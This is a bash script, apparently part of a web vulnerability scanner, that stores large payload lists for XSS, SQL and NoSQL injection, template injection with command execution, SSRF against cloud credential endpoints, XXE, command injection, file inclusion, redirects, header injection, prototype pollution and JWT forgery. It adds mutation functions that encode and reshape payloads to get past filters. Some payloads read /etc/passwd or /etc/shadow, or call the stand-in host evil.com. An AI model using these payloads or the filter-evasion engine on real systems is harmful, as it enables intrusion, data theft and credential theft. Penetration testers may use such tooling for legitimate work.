#!/bin/bash
# Advanced Payload Generator & Mutation Engine
# Generates, mutates, and encodes payloads for all vulnerability classes

# Payload categories and base payloads
declare -A PAYLOAD_CATEGORIES

# XSS Payloads
PAYLOAD_CATEGORIES[xss_basic]=$'<script>alert(1)</script>\n"><script>alert(1)</script>\n\'><script>alert(1)</script>\n"><img src=x onerror=alert(1)>\n\'><img src=x onerror=alert(1)>\n"><svg onload=alert(1)>\n\'><svg onload=alert(1)>\njavascript:alert(1)\n"><body onload=alert(1)>\n"><iframe src=javascript:alert(1)>\n"><video><source onerror=alert(1)>\n"><details open ontoggle=alert(1)>\n"><svg><animate onbegin=alert(1)>\n"><math><maction actiontype="statusline#http://example.com" xlink:href=#>CLICK'

# XSS Event Handlers
PAYLOAD_CATEGORIES[xss_events]=$'onload=alert(1)\nonerror=alert(1)\nonclick=alert(1)\nonmouseover=alert(1)\nonfocus=alert(1)\nonblur=alert(1)\nonchange=alert(1)\nonsubmit=alert(1)\nonkeydown=alert(1)\nonkeyup=alert(1)\nonmousedown=alert(1)\nonmouseup=alert(1)\nondblclick=alert(1)\noncontextmenu=alert(1)\nonwheel=alert(1)\nontoggle=alert(1)\nonanimationstart=alert(1)\nontransitionend=alert(1)'

# XSS Filter Bypass Payloads
PAYLOAD_CATEGORIES[xss_bypass]=$'<ScRiPt>alert(1)</ScRiPt>\n<scr<script>ipt>alert(1)</scr<script>ipt>\n<script>alert(1)<!--\n<script>alert(1)//\n"><script>alert(1)//"\n\'><script>alert(1)//\'\n<svg/onload=alert(1)>\n<svg onload=alert(1)>\n<svg/onload=alert(1)//"\n<svg onload=alert(1)//"\n<svg/onload=alert(1)//\'\n<svg/onload=alert(1)//\n<details open ontoggle=alert(1)>\n<details/open/ontoggle=alert(1)>\n<details//open/ontoggle=alert(1)>\n<video><source onerror=alert(1)>\n<video src=x onerror=alert(1)>\n<audio src=x onerror=alert(1)>\n<marquee onstart=alert(1)>\n<body onload=alert(1)>\n<input autofocus onfocus=alert(1)>\n<select onfocus=alert(1) autofocus>\n<textarea onfocus=alert(1) autofocus>\n<keygen onfocus=alert(1) autofocus>\n<video/poster/onerror=alert(1)>'

# SQL Injection Payloads
PAYLOAD_CATEGORIES[sqli_basic]=$'\' OR \'1\'=\'1\n\' OR \'1\'=\'1\' --\n\' OR \'1\'=\'1\' /*\n\' OR \'1\'=\'1\' #\n\' OR 1=1 --\n\' OR 1=1 /*\n\' OR 1=1 #\n" OR "1"="1\n" OR "1"="1" --\n" OR "1"="1" /*\n" OR 1=1 --\n" OR 1=1 /*\nadmin\' --\nadmin\' /*\nadmin\' #\n\' OR \'1\'=\'1\' LIMIT 1 --\n\' UNION SELECT NULL --\n\' UNION SELECT NULL,NULL --\n\' UNION SELECT NULL,NULL,NULL --\n\' UNION SELECT 1,2,3 --\n\' UNION SELECT username,password FROM users --'

# SQL Injection Time-Based
PAYLOAD_CATEGORIES[sqli_time]=$'\' OR SLEEP(5) --\n\' OR BENCHMARK(5000000,SHA1(\'test\')) --\n\' OR pg_sleep(5) --\n\' WAITFOR DELAY \'0:0:5\' --\n\' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --\n1; WAITFOR DELAY \'0:0:5\' --\n1 AND (SELECT * FROM (SELECT(SLEEP(5)))a) --\n\' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()))) --\n\' OR UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION())),1) --\n\'; WAITFOR DELAY \'0:0:5\' --\n1\'; WAITFOR DELAY \'0:0:5\' --\n\') WAITFOR DELAY \'0:0:5\' --\n\')); WAITFOR DELAY \'0:0:5\' --'

# SQL Injection Union-Based
PAYLOAD_CATEGORIES[sqli_union]=$'\' UNION SELECT NULL,NULL,NULL --\n\' UNION SELECT 1,2,3 --\n\' UNION SELECT @@version,NULL,NULL --\n\' UNION SELECT user(),NULL,NULL --\n\' UNION SELECT database(),NULL,NULL --\n\' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --\n\' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name=\'users\' --\n\' UNION SELECT username,password,NULL FROM users --\n\' UNION SELECT email,password,NULL FROM users --\n\' UNION SELECT id,username,password FROM users --\n\' UNION SELECT 1,concat(username,0x3a,password),3 FROM users --\n\' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users --'

# NoSQL Injection Payloads
PAYLOAD_CATEGORIES[nosql]=$'{"$ne": null}\n{"$gt": ""}\n{"$regex": ".*"}\n{"$where": "sleep(5000)"}\n{"$where": "this.password.match(/.*/)"}\n{"$or": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}\n{"username": {"$ne": null}, "password": {"$ne": null}}\n{"$gt": {"$gt": 1}}\n{"$exists": true}\n{"$nin": []}\n{"$in": ["admin", "administrator", "root", "test"]}\n{"username": {"$regex": "^adm"}}\n{"username": "admin", "password": {"$gt": ""}}'

# SSTI Payloads
PAYLOAD_CATEGORIES[ssti]=$'{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}\n{{config}}\n{{self}}\n{{request}}\n{{session}}\n{{url_for}}\n{{get_flashed_messages}}\n{{lipsum}}\n{{cycler}}\n{{joiner}}\n{{namespace}}\n{{\n    {{\n        {{\n            {{\n                {{\n                    {{7*7}}\n                }}\n            }}\n        }}\n    }}\n}}\n\${7*7}\n$${7*7}\n%{7*7}\n#{7*7}\n{{config.__class__.__init__.__globals__}}\n{{config.__class__.__init__.__globals__.__builtins__}}\n{{request.__class__.__mro__[2].__subclasses__()}}\n{{"".__class__.__mro__[2].__subclasses__()}}\n{{request.__class__.__mro__[2].__subclasses__()[40]("cat /etc/passwd",shell=True)()}}\n${T(java.lang.Runtime).getRuntime().exec("id")}\n<%= `id` %>\n#{`id`}\n${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}\n#{T(java.lang.Runtime).getRuntime().exec("id")}'

# SSRF Payloads
PAYLOAD_CATEGORIES[ssrf]=$'http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/user-data/\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://localhost:8080\nhttp://127.0.0.1:8080\nhttp://127.0.0.1:22\nhttp://127.0.0.1:3306\nhttp://127.0.0.1:5432\nhttp://127.0.0.1:6379\nhttp://127.0.0.1:80\nhttp://[::1]:8080\nhttp://[::1]:22\nhttp://2130706433\nhttp://0177.0.0.1\nhttp://internal.service.local\nfile:///etc/passwd\nfile:///etc/hosts\nfile:///proc/self/environ\nfile:///proc/version\nfile:///proc/net/tcp\ndict://localhost:11211/stat\ndict://localhost:6379/info\ngopher://127.0.0.1:6379/_INFO\ngopher://127.0.0.1:25/_HELO%20localhost\nldap://localhost:389\nldap://127.0.0.1:389\ntftp://127.0.0.1\nftp://127.0.0.1'

# XXE Payloads
PAYLOAD_CATEGORIES[xxe]=$'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<foo>&xxe;</foo>\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>\n<foo>&xxe;</foo>\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>\n<foo>&xxe;</foo>\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>\n<foo>&xxe;</foo>\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<foo>&xxe;</foo>\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>\n<foo>&xxe;</foo>\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "input:///etc/passwd">]>\n<foo>&xxe;</foo>'

# Command Injection Payloads
PAYLOAD_CATEGORIES[cmdi]=$'; id\n&& id\n| id\n|| id\n`id`\n$(id)\n; cat /etc/passwd\n&& cat /etc/passwd\n| cat /etc/passwd\n|| cat /etc/passwd\n`cat /etc/passwd`\n$(cat /etc/passwd)\n; ls -la\n&& ls -la\n| ls -la\n|| ls -la\n; whoami\n&& whoami\n| whoami\n|| whoami\n; uname -a\n&& uname -a\n| uname -a\n|| uname -a\n; sleep 5\n&& sleep 5\n| sleep 5\n|| sleep 5\n; ping -c 5 evil.com\n&& ping -c 5 evil.com\n| ping -c 5 evil.com\n|| ping -c 5 evil.com\n; nslookup evil.com\n&& nslookup evil.com\n| nslookup evil.com\n|| nslookup evil.com'

# LFI/RFI Payloads
PAYLOAD_CATEGORIES[lfi]=$'../../../../etc/passwd\n..%2f..%2f..%2f..%2fetc%2fpasswd\n..%252f..%252f..%252f..%252fetc%252fpasswd\n/var/www/html/../../../../etc/passwd\n/var/www/../../../../etc/passwd\n/etc/passwd\n/etc/hosts\n/etc/shadow\n/proc/self/environ\n/proc/version\n/proc/net/tcp\n/proc/cmdline\nC:\Windows\System32\drivers\etc\hosts\nC:\Windows\win.ini\nC:\boot.ini\n....//....//....//....//etc/passwd\n..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'

# Open Redirect Payloads
PAYLOAD_CATEGORIES[redirect]=$'https://evil.com\n//evil.com\n/\evil.com\nhttps://evil.com%2f%2e%2e\nhttps://evil.com@target.com\njavascript:alert(1)\ndata:text/html,<script>alert(1)</script>\nhttps://evil.com.%2f%2e%2e\nhttps://evil.com@target.com/\nhttps://target.com@evil.com\n/\/\/evil.com\n/\\evil.com\n/.\evil.com'

# Header Injection Payloads
PAYLOAD_CATEGORIES[header_injection]=$'\r\nX-Injected: true\n\nX-Injected: true\r\nLocation: https://evil.com\n\nLocation: https://evil.com\r\nSet-Cookie: injected=true\n\nSet-Cookie: injected=true\r\nAccess-Control-Allow-Origin: *\n\nAccess-Control-Allow-Origin: *\n%0d%0aX-Injected: true\n%0aX-Injected: true\n%0d%0aLocation: https://evil.com\n%0aLocation: https://evil.com'

# Prototype Pollution Payloads
PAYLOAD_CATEGORIES[prototype_pollution]=$'__proto__.polluted=1\nconstructor.prototype.polluted=1\n__proto__[polluted]=1\n{"__proto__":{"polluted":true}}\n{"constructor":{"prototype":{"polluted":true}}}\n__proto__.constructor.prototype.polluted=1\nconstructor.constructor("return process")().mainModule.require("child_process").execSync("id")'

# GraphQL Payloads
PAYLOAD_CATEGORIES[graphql]=$'{__schema{types{name fields{name}}}}\n{__schema{types{name fields{name type{name kind ofType{name kind}}}}} }\n{__typename}\n{__schema{queryType{name}}}\n{__schema{mutationType{name}}}\n{__schema{subscriptionType{name}}}\n{__schema{directives{name description locations args{name type}}}}\n{users{id username email password}}\n{user(id:1){id username email password}}\n{user(username:"admin"){id username email password}}\n{users(first:100){edges{node{id username email}}}}\n{node(id:"VXNlcjox"){...on User{id username email}}}'

# JWT Attack Payloads
PAYLOAD_CATEGORIES[jwt]=$'{"alg":"none","typ":"JWT"}\n{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}\n{"alg":"HS256","typ":"JWT","jku":"http://evil.com/key.json"}\n{"alg":"HS256","typ":"JWT","x5u":"http://evil.com/cert.pem"}\n{"alg":"HS256","typ":"JWT","x5c":["base64cert"]}\n{"alg":"RS256","typ":"JWT","kid":"../../../etc/passwd"}\n{"alg":"ES256","typ":"JWT","kid":"../../../etc/passwd"}'

# Mutation Engine Functions
mutate_payload() {
    local payload="$1"
    local mutation_type="${2:-all}"
    local mutated=()
    
    case "$mutation_type" in
        encoding)
            # URL encoding
            local url_enc=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null || echo "")
            [ -n "$url_enc" ] && mutated+=("$url_enc")
            
            # Double URL encoding
            local double_enc=$(printf '%s' "$url_enc" | jq -sRr @uri 2>/dev/null || echo "")
            [ -n "$double_enc" ] && mutated+=("$double_enc")
            
            # HTML entity encoding
            local html_enc=$(printf '%s' "$payload" | sed 's/&/\&/g; s/</\</g; s/>/\>/g; s/"/\"/g; s/'"'"'/\'/g' 2>/dev/null || echo "")
            [ -n "$html_enc" ] && mutated+=("$html_enc")
            
            # Hex encoding
            local hex_enc=$(printf '%s' "$payload" | xxd -p 2>/dev/null | tr -d '\n' | sed 's/\(..\)/%\1/g' || echo "")
            [ -n "$hex_enc" ] && mutated+=("$hex_enc")
            
            # Base64
            local b64_enc=$(printf '%s' "$payload" | base64 -w0 2>/dev/null || echo "")
            [ -n "$b64_enc" ] && mutated+=("$b64_enc")
            ;;
        case)
            # Uppercase
            local upper=$(printf '%s' "$payload" | tr '[:lower:]' '[:upper:]' 2>/dev/null || echo "")
            [ -n "$upper" ] && mutated+=("$upper")
            
            # Lowercase
            local lower=$(printf '%s' "$payload" | tr '[:upper:]' '[:lower:]' 2>/dev/null || echo "")
            [ -n "$lower" ] && mutated+=("$lower")
            
            # Simple alternating case using sed
            local alt=$(printf '%s' "$payload" | sed 's/\([a-z]\)/\U\1/g; s/\([A-Z]\)/\L\1/g' 2>/dev/null || echo "")
            [ -n "$alt" ] && mutated+=("$alt")
            ;;
        whitespace)
            # Space variations
            local sp_url=$(printf '%s' "$payload" | sed 's/ /%20/g' 2>/dev/null || echo "")
            [ -n "$sp_url" ] && mutated+=("$sp_url")
            
            local sp_plus=$(printf '%s' "$payload" | sed 's/ /+/g' 2>/dev/null || echo "")
            [ -n "$sp_plus" ] && mutated+=("$sp_plus")
            
            local sp_tab=$(printf '%s' "$payload" | sed 's/ /%09/g' 2>/dev/null || echo "")
            [ -n "$sp_tab" ] && mutated+=("$sp_tab")
            
            local sp_nl=$(printf '%s' "$payload" | sed 's/ /%0a/g' 2>/dev/null || echo "")
            [ -n "$sp_nl" ] && mutated+=("$sp_nl")
            
            local sp_cr=$(printf '%s' "$payload" | sed 's/ /%0d/g' 2>/dev/null || echo "")
            [ -n "$sp_cr" ] && mutated+=("$sp_cr")
            
            local sp_crnl=$(printf '%s' "$payload" | sed 's/ /%0a%0d/g' 2>/dev/null || echo "")
            [ -n "$sp_crnl" ] && mutated+=("$sp_crnl")
            
            local sp_comment=$(printf '%s' "$payload" | sed 's/ /\\/*/g' 2>/dev/null || echo "")
            [ -n "$sp_comment" ] && mutated+=("$sp_comment")
            
            local sp_null=$(printf '%s' "$payload" | sed 's/ /%00/g' 2>/dev/null || echo "")
            [ -n "$sp_null" ] && mutated+=("$sp_null")
            ;;
        comments)
            # SQL comments
            mutated+=("$payload--")
            mutated+=("$payload/*")
            mutated+=("$payload#")
            mutated+=("$payload;--")
            mutated+=("$payload;/*")
            mutated+=("$payload;#")
            
            # HTML comments
            mutated+=("<!--$payload-->")
            mutated+=("<!--$payload--!>")
            mutated+=("<!$payload>")
            ;;
        concatenation)
            # String concatenation
            mutated+=("'$payload'")
            mutated+=("\"$payload\"")
            mutated+=("CONCAT('$payload')")
            mutated+=("'$payload' || 'test'")
            mutated+=("'$payload' + 'test'")
            ;;
        all)
            mutate_payload "$payload" encoding
            mutate_payload "$payload" case
            mutate_payload "$payload" whitespace
            mutate_payload "$payload" comments
            mutate_payload "$payload" concatenation
            ;;
    esac
    
    printf '%s\n' "${mutated[@]}"
}

# Generate all mutations for a payload category
generate_mutations() {
    local category="$1"
    local output_dir="${2:-$CACHE_DIR/payloads}"
    local max_per_category="${3:-500}"
    
    mkdir -p "$output_dir"
    
    local base_payloads="${PAYLOAD_CATEGORIES[$category]}"
    if [ -z "$base_payloads" ]; then
        log "WARN" "Unknown payload category: $category"
        return 1
    fi
    
    local output_file="$output_dir/${category}_mutated.txt"
    : > "$output_file"
    
    local count=0
    while IFS= read -r payload; do
        [ -z "$payload" ] && continue
        
        echo "$payload" >> "$output_file"
        count=$((count + 1))
        
        # Generate mutations
        for mut_type in encoding case whitespace comments concatenation; do
            while IFS= read -r mutated; do
                [ -z "$mutated" ] && continue
                echo "$mutated" >> "$output_file"
                count=$((count + 1))
                [ $count -ge $max_per_category ] && break 3
            done < <(mutate_payload "$payload" "$mut_type")
        done
        
        [ $count -ge $max_per_category ] && break
        
    done <<< "$base_payloads"
    
    # Deduplicate
    sort -u "$output_file" -o "$output_file"
    
    log "INFO" "Generated $count mutations for $category"
    echo "$output_file"
}

# Generate all payload categories
generate_all_payloads() {
    local output_dir="${1:-$CACHE_DIR/payloads}"
    local max_per_category="${2:-500}"
    
    mkdir -p "$output_dir"
    
    local categories=(
        "xss_basic" "xss_events" "xss_bypass"
        "sqli_basic" "sqli_time" "sqli_union"
        "nosql" "ssti" "ssrf" "xxe" "cmdi" "lfi" "redirect" "header_injection"
        "prototype_pollution" "graphql" "jwt"
    )
    
    local combined_file="$output_dir/all_payloads.txt"
    : > "$combined_file"
    
    for category in "${categories[@]}"; do
        log "INFO" "Generating mutations for $category..."
        local file=$(generate_mutations "$category" "$output_dir" "$max_per_category")
        cat "$file" >> "$combined_file"
    done
    
    # Final deduplication
    sort -u "$combined_file" -o "$combined_file"
    
    local total=$(wc -l < "$combined_file")
    log "INFO" "Generated $total total unique payloads across all categories"
    
    echo "$combined_file"
}

# Smart payload selection based on context
select_payloads_for_context() {
    local context="$1"  # url_param, post_body, header, json, xml, graphql
    local vuln_type="$2"  # xss, sqli, ssrf, etc.
    local output_dir="${3:-$CACHE_DIR/payloads}"
    local max_payloads="${4:-100}"
    
    local candidates=()
    
    case "$context" in
        url_param)
            # URL parameters need URL encoding
            case "$vuln_type" in
                xss) candidates+=("xss_basic" "xss_events" "xss_bypass") ;;
                sqli) candidates+=("sqli_basic" "sqli_time" "sqli_union") ;;
                ssrf) candidates+=("ssrf") ;;
                redirect) candidates+=("redirect") ;;
                lfi) candidates+=("lfi") ;;
                cmdi) candidates+=("cmdi") ;;
                ssti) candidates+=("ssti") ;;
                prototype_pollution) candidates+=("prototype_pollution") ;;
            esac
            ;;
        post_body)
            case "$vuln_type" in
                xss) candidates+=("xss_basic" "xss_events" "xss_bypass") ;;
                sqli) candidates+=("sqli_basic" "sqli_time" "sqli_union") ;;
                nosql) candidates+=("nosql") ;;
                cmdi) candidates+=("cmdi") ;;
                ssti) candidates+=("ssti") ;;
                prototype_pollution) candidates+=("prototype_pollution") ;;
            esac
            ;;
        header)
            case "$vuln_type" in
                xss) candidates+=("xss_basic" "xss_events") ;;
                ssrf) candidates+=("ssrf") ;;
                cmdi) candidates+=("cmdi") ;;
                header_injection) candidates+=("header_injection") ;;
            esac
            ;;
        json)
            case "$vuln_type" in
                nosql) candidates+=("nosql") ;;
                prototype_pollution) candidates+=("prototype_pollution") ;;
                ssti) candidates+=("ssti") ;;
                cmdi) candidates+=("cmdi") ;;
            esac
            ;;
        xml)
            candidates+=("xxe")
            ;;
        graphql)
            candidates+=("graphql")
            ;;
    esac
    
    # Combine selected categories
    local output_file="$output_dir/smart_${context}_${vuln_type}.txt"
    : > "$output_file"
    
    for cat in "${candidates[@]}"; do
        if [ -f "$output_dir/${cat}_mutated.txt" ]; then
            cat "$output_dir/${cat}_mutated.txt" >> "$output_file"
        else
            generate_mutations "$cat" "$output_dir" 200
            cat "$output_dir/${cat}_mutated.txt" >> "$output_file"
        fi
    done
    
    sort -u "$output_file" -o "$output_file"
    
    # Limit to max
    if [ $(wc -l < "$output_file") -gt $max_payloads ]; then
        head -n $max_payloads "$output_file" > "${output_file}.tmp"
        mv "${output_file}.tmp" "$output_file"
    fi
    
    log "INFO" "Selected $(wc -l < "$output_file") payloads for $context/$vuln_type"
    echo "$output_file"
}

export -f mutate_payload generate_mutations generate_all_payloads select_payloads_for_context